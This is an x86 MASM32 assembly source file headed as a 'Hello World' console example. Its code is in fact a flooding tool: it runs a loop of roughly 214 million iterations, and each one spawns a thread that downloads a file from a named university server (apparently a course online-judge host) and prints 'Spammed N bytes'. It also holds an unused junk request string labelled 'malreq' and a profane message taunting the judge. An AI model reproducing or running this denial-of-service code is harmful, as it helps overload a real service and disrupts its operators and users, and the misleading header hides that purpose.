; *************************************************************************
; 32-bit Windows Console Hello World Application - MASM32 Example
; EXE File size: 2,560 Bytes
; Created by Visual MASM (http://www.visualmasm.com)
; *************************************************************************
                                    
.386					; Enable 80386+ instruction set
.model flat, stdcall	; Flat, 32-bit memory model (not used in 64-bit)
option casemap: none	; Case insensitive syntax

; *************************************************************************
; MASM32 proto types for Win32 functions and structures
; *************************************************************************  
include \masm32\include\kernel32.inc
;include \masm32\include\masm32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\urlmon.inc
include \masm32\include\wininet.inc

         
; *************************************************************************
; MASM32 object libraries
; *************************************************************************  
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\urlmon.lib
includelib \masm32\lib\wininet.lib


main             PROTO
start_new_thread PROTO :DWORD, :DWORD
new_thread       PROTO :DWORD


; *************************************************************************
; Our data section. Here we declare our strings for our message
; *************************************************************************
.data
	tblock STRUCT
 		strn1 BYTE 260 dup (?)
   		strn2 BYTE 260 dup (?)
     	reserved DWORD ?             ; this is used internally
     	thcount  DWORD ?             ; thread counter
	tblock ENDS
	
	message	BYTE "Fuck Dxtx Struct oj! I haven't done hw 8!!!", 0         ; nweline 10
	malreq  BYTE "GET +%z%+%z%+%z%+%z%+%z%+%z%&%$%$!@#$%^&^%%^%#^#^&%^*()*_()*%^%@#%$%^*.htm", 0

; *************************************************************************
; Our executable assembly code starts here in the .code section
; *************************************************************************
.code

start:
	call main

	


main PROC
	LOCAL webreq:tblock
         
	mov ecx, 214783646
	mov webreq.thcount, 0
	cst ADDR webreq.strn1, "https://ds109.ncu.edu.tw/"
    cst ADDR webreq.strn2, "hellworld.txt"    
		
FuckOj:
	push ecx	
	
    ;invoke StdOut, addr message
    print addr message       
	invoke start_new_thread, OFFSET new_thread, ADDR webreq 
    
	pop ecx    
    loop FuckOj 
	 
EndLoop:    
	; When the console has been closed, exit the app with exit code 0
    invoke ExitProcess, 0


main ENDP


; *************************************************************************
; Threads
; *************************************************************************

start_new_thread proc pthread:DWORD, pstruct:DWORD

    LOCAL tID:DWORD

    push esi

  	; load the "reserved" flag address into ESI
    mov eax, pstruct
    lea esi, (tblock PTR [eax]).reserved

  	; now, set the "reserved" flag to 1
    mov DWORD PTR [esi], 1

    invoke CreateThread, 0, 0, pthread, pstruct, 0, ADDR tID

  ; run a yielding loop until new thread ok (when sets "reserved" flag back to zero)
  spinlock:
    invoke SleepEx,1,0
    cmp DWORD PTR [esi], 0
    jne spinlock

    pop esi

    mov eax, tID
    ret

start_new_thread endp

new_thread proc pstruct:DWORD

    LOCAL pst1  :DWORD
    LOCAL pst2  :DWORD
    LOCAL flen  :DWORD
    LOCAL buffer1[260]:BYTE
    LOCAL buffer2[260]:BYTE

    mov pst1, ptr$(buffer1)
    mov pst2, ptr$(buffer2)

    push esi
    push edi

  	; copy args passed in structure to local variables
    mov edi, pstruct
    lea esi, (tblock PTR [edi]).reserved

  	; copy each string to a local buffer
    lea ecx, (tblock PTR [edi]).strn1
    cst pst1, ecx
    lea ecx, (tblock PTR [edi]).strn2
    cst pst2, ecx

  	; reset the "reserved" flag back to zero to unlock calling thread
    mov DWORD PTR [esi], 0

  	; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  	; GOGO POWER THREAD
  	; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    add (tblock PTR [edi]).thcount, 1       ; increment thread counter on start

    ;print " "
    ;print pst2, 13, 10

    fn URLDownloadToFile,0, pst1, pst2, 0, 0
    ;fn HttpSendRequestA, ... undoneQQww

    invoke filesize, pst2
    mov flen, eax
    print "Spammed "
    print str$(flen)," bytes", 13,10

    sub (tblock PTR [edi]).thcount, 1       ; decrement thread counter on exit

    pop edi
    pop esi

    ret

new_thread endp
end start
